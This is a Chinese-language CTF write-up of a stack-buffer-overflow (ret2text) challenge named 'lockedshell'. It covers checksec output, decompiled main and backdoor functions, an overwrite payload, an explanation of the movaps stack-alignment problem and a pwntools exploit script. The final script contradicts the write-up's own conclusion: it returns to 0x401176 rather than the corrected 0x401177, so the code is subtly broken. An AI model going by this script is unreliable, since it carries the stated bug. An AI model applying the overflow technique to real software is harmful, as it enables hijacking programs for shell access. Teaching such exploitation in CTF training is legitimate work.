# 看起来是一道ret2text
## 先审题
```
> checksec --file=lockedshell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   34) Symbols       No    0               
```
看得出来，栈溢出保护和PIE都没有开启，看起来就很简单了，那放到ida里静态分析一下

main函数：
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s1[80]; // [rsp+0h] [rbp-A0h] BYREF
  char s2[80]; // [rsp+50h] [rbp-50h] BYREF

  init(argc, argv, envp);
  arc4random_buf(s1, 80LL);
  write(1, "This is my own shell, enter the password or get out.\n", 0x36uLL);
  gets(s2);
  if ( !strncmp(s1, s2, 0x50uLL) )
    my_shell();
  else
    write(1, "Password wrong!\n", 0x11uLL);
  return 0;
}
```
注意到存在gets函数，可能是后面会用到的溢出点，多留意一下

还注意到(~~特有的注意力惊人~~)有一个my_shell函数，应该就是我们需要的后门函数了，跟进去看看

my_shell:
```c
int my_shell()
{
  write(1, "Welcome back.\n", 0xFuLL);
  return system("/bin/sh");
}
```
好的，破案了，就是ret2text，那么需要做什么呢？

## 做题
之前gets处有泄露点了，那只需要找一下后门的地址就好了，在ida里面看一下，发现是`0x401176`，那么payload就很好写了

`payload = b'a'*(0x50+8)+p64(0x401176)`

于是，我们就发现喜提

`[*] Got EOF while reading in interactive`

寄啦!(~~悲QAQ~~)(~~于是师傅转投其他方向，再也不回pwn了~~)

打住打住，看一下是什么原因

调用`system`的时候会发生栈对齐的问题。如果直接返回到`my_shell`，程序运行的时候就会触发段错误，可以尝试使用gdb看看，这里不多加赘述。

```
movaps xmmword ptr[rsp+0x50],xxm0
```

其实是`movaps`指令要求目标地址必须16字节对齐(也就是可以被16整除)导致的，所以我们可以通过把劫持的地址+1来跳过my_shell中`push rbp`(因为这个指令机器码长度只有1字节),使得`rsp`16字节对齐

所以，payload应该是：

`payload = b'a'*(0x50+8)+p64(0x401177)`

## exp
```python
from pwn import *
context(os='linux',terminal=['tmux','sp','-h'],log_level='debug')
p = process('./lockedshell')

payload = b'a'*0x50+b'b'*0x8+p64(0x401176)

p.sendlineafter(b".\n",payload)
p.interactive()
```
## tips
- 如果你的ida打开文件后是汇编，试试按一下tab键
- 如果不想一个翻函数去找后门，试试`shift+f12`,找到`/bin/sh/`，双击，然后对着它按`ctrl+x`，就可以快速找到后门位置了
- 关于pwntools的一些常用命令，可以参考[官方文档](https://docs.pwntools.com/en/stable/index.html)
- 关于题目方面的任何问题，欢迎及时和学长交流(~~群里那个粉头像学长~~)